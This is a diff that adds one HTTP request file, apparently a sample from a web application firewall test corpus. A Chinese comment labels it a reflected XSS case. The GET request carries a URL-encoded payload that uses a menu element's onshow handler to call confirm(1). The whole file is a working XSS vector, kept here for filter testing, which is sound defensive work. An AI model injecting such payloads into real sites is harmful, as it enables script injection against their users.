@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_menu标签_onshow事件-06506681
+# 攻击载荷利用了HTML中的menu标签和onshow属性，触发confirm()函数，显示一个提示框。显示触发上下文菜单
+GET /?id=%3Cdiv%20contextmenu=xss%3E%3Cp%3ERight%20click%3Cmenu%20type=context%20id=xss%20onshow=confirm%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E&bid=hd_tag_m8mv25qr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25qr
+RM-PRO-Token: f5f6a86e08ff39e21a4c7f41af0a98d6
+RM-PRO-Time: 1742808501512
+User-Agent: curl/7.83.1
+
